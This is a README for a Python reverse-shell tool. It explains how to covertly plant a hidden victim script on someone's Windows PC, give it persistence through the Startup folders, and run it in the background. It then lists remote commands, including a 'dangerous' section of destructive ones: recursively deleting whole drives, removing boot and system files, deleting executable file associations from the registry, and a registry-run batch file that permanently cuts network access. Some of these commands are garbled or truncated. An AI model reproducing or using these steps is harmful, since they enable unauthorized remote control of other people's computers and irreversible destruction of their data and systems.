# REVERSE SHELL

Description: This program is a python based reverse-shell attack tool which is cross-platform.

**_HOW TO RUN:_**

To run this (windows 7-10):

**_ATTACKER PART:-_**
STEP-1: Type ipconfig in cmd to check your local ipv4.

STEP-2: Change victim.py file's server variable to your local ipv4

STEP-3: Run py attacker.py on attacker computer


(ATTACKER COMPUTER SHOULD BE ON THE SAME LOCAL NETWORK AS THE VICTIM'S PC)


Next, you need to plant the victim.py file on your victim's computer, make it hiddenn and add it to startup programs list.


**_VICTIM PART_**
(MAKE SURE VICTIM HAS PYTHON 3.6 or higher as python 3.6 or lower version do not support the new threading module)
STEP-1: Plant the file
STEP-2: Make it Hidden - To make the file hidden, Right click on the file, click on hidden then click Apply and then Click Ok
STEP-3: Add the file to startup folder - "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"


THIS PUT'S THE FILE IN STARTUP FOR ALL USERS, TO PUT IT IN STARTUP FOR ONLY ONE USER, ADD THE FILE TO THE FOLLOWING DIRECTOR -
C:\Users\[User Name]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.


STEP-4: Open cmd in that folder and type: pythonw s.py


The w flag added after python makes the file run in background


STEP-5: Now the reverse-shell file is running in the background and you can close the current shell (cmd/terminal)


Now you can run every command that a normal cmd user can run from the attacker's computer
Here are some basic commands to get you started:-


Start chrome - start chrome
Start notepad - start notepad
Open a URL - start {url here}
Shutdown Computer - shutdown /s
Network Details - ipconfig
List Director - dir
Network Statistics - netstat
ping an ip/url - ping {ip/url}
Trace Route of ip/url - tracert {ip/url}
Power configuration - powercfg
Basic User Details - whoami
System Information - systeminfo
Schedule Tasks - schtasks {task}


DANGEROUS COMMANDS:
Don't use for pranks, these commands can permanently harm a pc's software/hardware so even changing os won't work to fix some issues.


i) Format Hard drives :-


rd/s/q/ D:\
rd/s/q/ C:\
rd/s/q/ E:\


ii) Delete System 32 Files :-


attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini


iii) Delete All System Files:-


del*.*


Delete Registry Entry:-
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/\*


iv) Disable Internet Permanently


echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window


v) Windows Blue Screen of Death


@echo off
delete %systemdrive%\*.\* /f /s


FOR MORE INFO, Contact Developer :-


email: arjunagnihotri14a@gmail.com
